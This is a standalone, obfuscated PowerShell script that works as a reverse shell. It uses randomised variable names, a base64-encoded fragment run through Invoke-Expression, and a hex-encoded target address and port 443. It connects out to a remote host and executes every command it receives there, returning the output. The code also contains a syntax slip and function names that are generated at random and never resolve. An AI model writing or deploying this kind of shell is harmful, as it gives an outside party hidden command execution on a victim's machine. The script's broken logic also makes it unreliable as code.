function Get-RandomString { param ([int]$length = 8) -join ((65..90) + (97..122) | Get-Random -Count $length | % {[char]$_]) } $ipVar = Get-RandomString; $portVar = Get-RandomString; $clientVar = Get-RandomString; $streamVar = Get-RandomString; $writerVar = Get-RandomString; $readerVar = Get-RandomString; $commandVar = Get-RandomString; $outputVar = Get-RandomString; $trueVar = Get-RandomString; $decodedVar = Get-RandomString; Set-Variable -Name $ipVar -Value '0xc0a8012f'; Set-Variable -Name $portVar -Value 0x1bb; function $(Get-RandomString) { $encoded = "JHN0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCkKJHdyaXRlciA9IE5ldy1PYmplY3QgU3lzdGVtLklPLlN0cmVhbVdyaXRlcigkc3RyZWFtKQokcmVhZGVyID0gTmV3LU9iamVjdCBTeXN0ZW0uU3RyZWFtUmVhZGVyKCRzdHJlYW0pCg=="; Set-Variable -Name $decodedVar -Value ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded))); Invoke-Expression (Get-Variable -Name $decodedVar).Value } function $(Get-RandomString) { param ($ip, $port) try { $client = New-Object System.Net.Sockets.TCPClient($ip, $port); $stream = $client.GetStream(); $writer = New-Object System.IO.StreamWriter($stream); $reader = New-Object System.IO.StreamReader($stream); return @($client, $stream, $writer, $reader) } catch { Write-Error "Connexion échouée"; exit } } function $(Get-RandomString) { param ($client, $stream, $writer, $reader) while ($true) { $writer.Write((pwd).Path + "> "); $writer.Flush(); $command = $reader.ReadLine(); if ($command -eq "exit") { break }; $output = Invoke-Expression -Command $command 2>&1 | Out-String; $writer.WriteLine($output); $writer.Flush() } $client.Close() } $(Get-RandomString); $conn = $(Get-RandomString) -ip (Get-Variable -Name $ipVar).Value -port (Get-Variable -Name $portVar).Value; $(Get-RandomString) -client $conn[0] -stream $conn[1] -writer $conn[2] -reader $conn[3]
